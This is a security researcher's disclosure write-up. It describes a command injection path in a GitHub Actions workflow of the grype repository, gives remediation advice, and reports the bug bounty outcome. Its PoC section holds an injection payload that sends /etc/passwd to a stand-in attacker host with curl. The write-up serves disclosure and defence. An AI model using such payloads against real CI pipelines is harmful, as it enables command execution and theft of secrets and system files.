
# GitHub Actions RCE Vulnerability (Informative Report)

This repo documents a **command injection vulnerability** identified in the GitHub Actions workflow of the [`anchore/grype`](https://github.com/anchore/grype) repository. The bug was responsibly reported to GitHub via HackerOne.

Although the report was marked **Informative** due to scope policy, the vulnerability path was technically valid and involved unsafe user input passed into an unvalidated GitHub Actions workflow.

## 🐞 Summary

**Repository Affected:** `anchore/grype`

**Vulnerability Type:** Command Injection via Improper Input Validation (CWE-20 / CWE-94)

**Impact:** The vulnerability could allow an attacker to execute arbitrary commands on GitHub-hosted runners and potentially exfiltrate environment secrets.

**Disclosure:** Submitted to GitHub Bug Bounty via HackerOne. Closed as Informative due to scope rules.

## 📄 Vulnerability Details

### 🧠 Vulnerable File
```
.github/workflows/update-anchore-dependencies.yml
```

### 🔥 Vulnerable Input Path
```yaml
workflow_dispatch:
  inputs:
    repos:
      description: "List of dependencies to update"
      required: true
      type: string

jobs:
  update:
    steps:
      - uses: anchore/workflows/.github/actions/update-go-dependencies@main
        with:
          repos: ${{ github.event.inputs.repos }}
```

This input is passed **unsanitized** into a GitHub action. If used in a shell or CLI context in the downstream `update-go-dependencies` action, it could result in remote code execution (RCE).

## 💣 PoC (Theoretical Injection Payload)

```
"; curl http://attacker.com --data @/etc/passwd; echo "
```

## 📸 Screenshots

See `/screenshots` folder for proof:
- Vulnerable `workflow_dispatch` input path
- Injection location traced
- Action file existence check

## 🔐 Security Recommendations

- Escape user input with `${{ toJSON(...) }}` or quote usage in shell
- Validate `repos` against a strict regex (e.g., `^[a-zA-Z0-9._/-]+$`)
- Avoid passing untrusted values into scripts or shell commands

## 📬 Disclosure Outcome

This issue was reported via the [GitHub Bug Bounty Program](https://bounty.github.com) on HackerOne.

> ✅ The vulnerability was **acknowledged as valid** and marked **“Informative”**, meaning the technical issue was real, but not eligible for bounty due to scope limitations.

### 📨 Summary of GitHub’s Response:
```
Thank you for your report. The workflow you analyzed belongs to a third-party project (anchore/grype), which is outside the paid scope of GitHub's bounty program. However, your report is informative and demonstrates a valid risk pattern.
```

## 📎 Report Outcome

- **Platform:** HackerOne → GitHub Program
- **Report ID:** #3214599 (Closed as Informative)
- **GitHub Message:** Out of paid bounty scope + marked as informative
- **Maintainers invited to patch via `security.md` link**

## 🧠 Notes

This was a valid issue from a CI/CD and DevSecOps perspective. The techniques used here are applicable to many public GitHub Actions projects.

**Researcher:** Abrar

For educational use only. Always follow responsible disclosure practices.
